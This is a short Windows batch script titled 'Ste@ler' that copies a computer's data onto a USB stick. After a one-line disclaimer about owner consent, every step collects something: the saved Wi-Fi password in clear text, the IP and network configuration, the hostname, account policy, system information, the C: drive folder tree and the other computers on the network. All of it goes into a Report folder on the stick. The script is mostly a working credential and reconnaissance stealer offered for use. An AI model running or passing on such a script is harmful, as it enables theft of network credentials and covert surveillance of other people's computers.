
echo off
cls
title Ste@ler
echo I am not responsible for your actions, in any case.
echo Use my software only on computers that you have the owner's agreement.
echo Thank you for trusting me using my software.
echo ---------
set /p nouvelle_variable="Enter the letter of your usb key (D,E,F...) : "
cd %nouvelle_variable%:\
md Report
set /p wifipassword="Enter the name of the wifi to which you are connected : "
cls
echo Press [ENTER] to start the program
pause >nul
echo Working...
ipconfig >%nouvelle_variable%:\Report\ipconfig.txt
echo -ip: OK
ipconfig /all >%nouvelle_variable%:\Report\ipconfigall.txt
echo -all ips: OK
hostname >%nouvelle_variable%:\Report\hostname.txt
echo -hostname: OK
netsh wlan show profile name=%wifipassword% key=clear >%nouvelle_variable%:\Report\wifipassword.txt
echo -wifi password : OK
net accounts >%nouvelle_variable%:\Report\netaccounts.txt
echo -windows accounts: OK
ver >%nouvelle_variable%:\Report\versionwindows.txt
echo -version of windows: OK
systeminfo >%nouvelle_variable%:\Report\systeminfo.txt
echo -system information: OK
tree C: >%nouvelle_variable%:\Report\treeC.txt
echo -organization folders: OK
net view >%nouvelle_variable%:\Report\netview.txt
echo -computer on the network: OK
cls
echo Thanks for using my software
timeout /T 05 /NOBREAK
exit
